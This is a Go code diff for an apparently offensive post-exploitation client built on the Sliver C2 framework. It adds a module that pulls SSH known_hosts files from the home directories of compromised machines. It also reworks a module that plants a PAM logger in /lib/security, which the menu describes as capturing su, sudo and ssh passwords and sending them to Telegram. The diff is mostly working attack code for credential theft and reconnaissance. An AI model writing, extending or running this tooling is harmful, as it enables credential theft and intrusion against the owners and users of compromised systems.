@@ -221,6 +221,37 @@ func compressGzipData(uncompressedData string) ([]byte, error) {
 	return compressedData.Bytes(), nil
 }
 
+func runSearchKnownHosts(rpc rpcpb.SliverRPCClient, session *clientpb.Session) {
+	var KnownHost_list []string
+	KnownHost_list = append(KnownHost_list,"/root/" )
+
+	files, err := ls_session_file(rpc, session, "/home/")
+	if err != nil {
+		log.Fatalf("get folder failed: %v", err)
+	}
+	for _, file := range files.Files {
+		if file.IsDir  {
+			//log.Printf("%s is directory",file.Name)
+			KnownHost_list = append(KnownHost_list,"/home/." + file.Name )
+		} 
+	}
+	for _, known_host := range KnownHost_list {
+		known_host = known_host  + ".ssh/known_hosts"
+		log.Printf("Starting Downloading files. %s",known_host)
+		known_host_file, err := download_file(rpc,session,known_host)
+		if err != nil {
+			log.Printf("download %s failed: %v", known_host_file, err)
+			continue
+		} else {
+			fmt.Printf("download success %s\n", known_host_file.Path)
+			decodedString, err := decompressGzipData(known_host_file.Data)
+			if err != nil {
+				log.Fatal("error decompressing data: %v", err)
+			}
+			log.Print("%s content of %s",known_host_file,decodedString)
+		}
+	}
+}
 func searchCredentialsFromFiles(rpc rpcpb.SliverRPCClient, session *clientpb.Session) {
 	fmt.Print("Still working on it ")
 }
@@ -228,7 +259,7 @@ func searchCredentialsFromMemory(rpc rpcpb.SliverRPCClient, session *clientpb.Se
 	fmt.Print("Still working on it ")
 }
 func runPamLoggerModule(rpc rpcpb.SliverRPCClient, session *clientpb.Session) {
-	fmt.Println("\n\nStart adding pam logger in Hostname:", session.Hostname, "Version:", session.Version, "RemoteAddress:", session.RemoteAddress)
+	log.Println("\n\nStart adding pam logger in Hostname:", session.Hostname, "Version:", session.Version, "RemoteAddress:", session.RemoteAddress)
 
 	var pamPaths []string
 	var configLine string
@@ -302,7 +333,7 @@ func runPamLoggerModule(rpc rpcpb.SliverRPCClient, session *clientpb.Session) {
 
 	files, err := ls_session_file(rpc, session, "/lib/security")
 	if err != nil {
-		log.Fatalf("獲取 sessions failed: %v", err)
+		log.Fatalf("get files failed: %v", err)
 	}
 	foundLogger := false
 	for _, file := range files.Files {
@@ -329,7 +360,7 @@ func runPamLoggerModule(rpc rpcpb.SliverRPCClient, session *clientpb.Session) {
 		} else {
 			fmt.Printf("modify /lib/security/ permission success %s", chmodFiles)
 		}
-		uploadFiles, err := upload_file(rpc, session, "/Users/timmy/Downloads/logger", "/lib/security/logger")
+		uploadFiles, err := upload_file(rpc, session, pamLoggerPath, "/lib/security/logger")
 		if err != nil {
 			log.Fatalf("upload failed: %v", err)
 		} else {
@@ -350,12 +381,24 @@ func runPamLoggerModule(rpc rpcpb.SliverRPCClient, session *clientpb.Session) {
 	}
 }
 
+var sliverConfigPath string
+var pamLoggerPath string
 func main() {
-	var configPath string
-	flag.StringVar(&configPath, "config", "/Users/timmy/Desktop/security/Sliver/client/timmy_mac_35.236.161.97.cfg", "path to sliver client config file")
+	// var configPath string
+	// flag.StringVar(&configPath, "config", "/Users/timmy/Downloads/timmy_mac_35.236.161.97.cfg", "path to sliver client config file")
+	// flag.Parse()
+
+
+	// 定义两个命令行参数
+	flag.StringVar(&sliverConfigPath, "sliver-config", "/Users/timmy/Downloads/timmy_mac_35.236.161.97.cfg", "path to sliver client config file")
+	flag.StringVar(&pamLoggerPath, "pam-logger", "/Users/timmy/Downloads/loogger", "path to PAM logger config file")
+
+	// 解析命令行参数
 	flag.Parse()
 
-	config, err := assets.ReadConfig(configPath)
+
+
+	config, err := assets.ReadConfig(sliverConfigPath)
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -408,8 +451,9 @@ func main() {
 
 	moduleItems := []string{
 		"pam_logger (logger su sudo ssh authentication password and send to telegram)",
-		"search credentials from files",
+		"Search for ssh known hosts",
 		"search credentials from memory",
+		"search credentials from files",
 	}
 
 	promptModule := promptui.Select{
@@ -426,24 +470,29 @@ func main() {
 	modules := []int{}
 	switch moduleResult {
 	case "All Modules":
-		modules = []int{1, 2, 3}
+		modules = []int{1, 2, 3,4}
 	case moduleItems[0]:
 		modules = append(modules, 1)
 	case moduleItems[1]:
 		modules = append(modules, 2)
 	case moduleItems[2]:
 		modules = append(modules, 3)
+	case moduleItems[3]:
+		modules = append(modules, 4)
 	}
 
 	for _, session := range sessions.Sessions {
 		for _, module := range modules {
+			log.Printf("Starting exploit %s with module \"%s\"\n\n",session.Hostname,moduleItems[module-1])
 			switch module {
 			case 1:
 				runPamLoggerModule(rpc, session)
 			case 2:
-				searchCredentialsFromFiles(rpc, session)
+				runSearchKnownHosts(rpc, session)
 			case 3:
 				searchCredentialsFromMemory(rpc, session)
+			case 4:
+				searchCredentialsFromFiles(rpc, session)
 			default:
 				fmt.Println("unvalid module id ")
 			}
